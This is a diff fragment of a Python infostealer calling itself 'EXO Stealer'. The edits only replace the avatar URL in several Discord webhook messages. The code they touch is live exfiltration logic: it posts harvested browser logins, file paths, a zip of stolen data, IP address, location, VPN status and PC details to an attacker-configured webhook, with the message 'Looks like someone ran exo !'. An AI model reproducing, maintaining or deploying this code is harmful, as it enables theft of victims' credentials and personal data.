@@ -507,10 +507,10 @@ class Browsers:
         os.remove("exo.zip")
         
         logins = ''.join(self.furrypp5) if self.furrypp5 != '' else 'None'
-        requests.post(config['__HOOK__'],json={ "content": '', "embeds": [ { "description": f"```diff{logins}```", "color": 13290186, "author": { "name": "Important Logins" } } ], "username": "EXO Stealer", "avatar_url": "https://images-ext-1.discordapp.net/external/okk9uE4g__hvO5ooTFM5HmvnJ2Cs-hbl5RsIo4H5q9g/%3Fq%3Dtbn%3AANd9GcQgD5ZVspNy6ixvhHNlXkl96WI6mGrEM5S9iw%26usqp%3DCAU/https/encrypted-tbn0.gstatic.com/images", "attachments": [] })
+        requests.post(config['__HOOK__'],json={ "content": '', "embeds": [ { "description": f"```diff{logins}```", "color": 13290186, "author": { "name": "Important Logins" } } ], "username": "EXO Stealer", "avatar_url": "https://th.bing.com/th/id/R.bb9a91f3e3c5fe04758ad3c07dff0c0b?rik=1MwLfr%2bQ%2fADJ3w&pid=ImgRaw&r=0&adlt=strict", "attachments": [] })
         
         paths = '\n+'.join(set(self.furrypp4))
-        requests.post(config['__HOOK__'],json={ "content": '', "embeds": [ { "color": 13290186, "fields": [ { "name": "Time", "value": f"{time}", "inline": True }, { "name": "Location", "value": f"{c}", "inline": True }, { "name": "VPN", "value": f"{vpn}", "inline": True }, { "name": "Paths Found", "value": f"```diff\n+{paths}```" }, { "name": "Zip File", "value": f"{psite}" } ], "author": { "name": "Looks like someone ran exo !" } } ], "username": "EXO Stealer", "avatar_url": "https://images-ext-1.discordapp.net/external/okk9uE4g__hvO5ooTFM5HmvnJ2Cs-hbl5RsIo4H5q9g/%3Fq%3Dtbn%3AANd9GcQgD5ZVspNy6ixvhHNlXkl96WI6mGrEM5S9iw%26usqp%3DCAU/https/encrypted-tbn0.gstatic.com/images", "attachments": [] })
+        requests.post(config['__HOOK__'],json={ "content": '', "embeds": [ { "color": 13290186, "fields": [ { "name": "Time", "value": f"{time}", "inline": True }, { "name": "Location", "value": f"{c}", "inline": True }, { "name": "VPN", "value": f"{vpn}", "inline": True }, { "name": "Paths Found", "value": f"```diff\n+{paths}```" }, { "name": "Zip File", "value": f"{psite}" } ], "author": { "name": "Looks like someone ran exo !" } } ], "username": "EXO Stealer", "avatar_url": "https://th.bing.com/th/id/R.bb9a91f3e3c5fe04758ad3c07dff0c0b?rik=1MwLfr%2bQ%2fADJ3w&pid=ImgRaw&r=0&adlt=strict", "attachments": [] })
 
 
 class System:
@@ -525,7 +525,7 @@ class System:
         
         payload = {
             'username': 'EXO Stealer',
-            'avatar_url': 'https://images-ext-1.discordapp.net/external/okk9uE4g__hvO5ooTFM5HmvnJ2Cs-hbl5RsIo4H5q9g/%3Fq%3Dtbn%3AANd9GcQgD5ZVspNy6ixvhHNlXkl96WI6mGrEM5S9iw%26usqp%3DCAU/https/encrypted-tbn0.gstatic.com/images',
+            'avatar_url': 'https://th.bing.com/th/id/R.bb9a91f3e3c5fe04758ad3c07dff0c0b?rik=1MwLfr%2bQ%2fADJ3w&pid=ImgRaw&r=0&adlt=strict',
             'embeds': [
                 {
                     'title': f'IP Info for {self.r["ip"]}',
@@ -572,7 +572,7 @@ class System:
             "embeds": [
                 {
                     "title": "PC Info",
-                    "avatar_url": "https://images-ext-1.discordapp.net/external/okk9uE4g__hvO5ooTFM5HmvnJ2Cs-hbl5RsIo4H5q9g/%3Fq%3Dtbn%3AANd9GcQgD5ZVspNy6ixvhHNlXkl96WI6mGrEM5S9iw%26usqp%3DCAU/https/encrypted-tbn0.gstatic.com/images",
+                    "avatar_url": "https://th.bing.com/th/id/R.bb9a91f3e3c5fe04758ad3c07dff0c0b?rik=1MwLfr%2bQ%2fADJ3w&pid=ImgRaw&r=0&adlt=strict",
                     "description": "EXO Stealer",
                     "color": 0x03,
                     "fields": [
@@ -677,7 +677,7 @@ if __name__ == '__main__':
                 }
             ],
         "username": "EXO Stealer",
-        "avatar_url": "https://images-ext-1.discordapp.net/external/okk9uE4g__hvO5ooTFM5HmvnJ2Cs-hbl5RsIo4H5q9g/%3Fq%3Dtbn%3AANd9GcQgD5ZVspNy6ixvhHNlXkl96WI6mGrEM5S9iw%26usqp%3DCAU/https/encrypted-tbn0.gstatic.com/images",
+        "avatar_url": "https://th.bing.com/th/id/R.bb9a91f3e3c5fe04758ad3c07dff0c0b?rik=1MwLfr%2bQ%2fADJ3w&pid=ImgRaw&r=0&adlt=strict",
         "attachments": []
     }
     
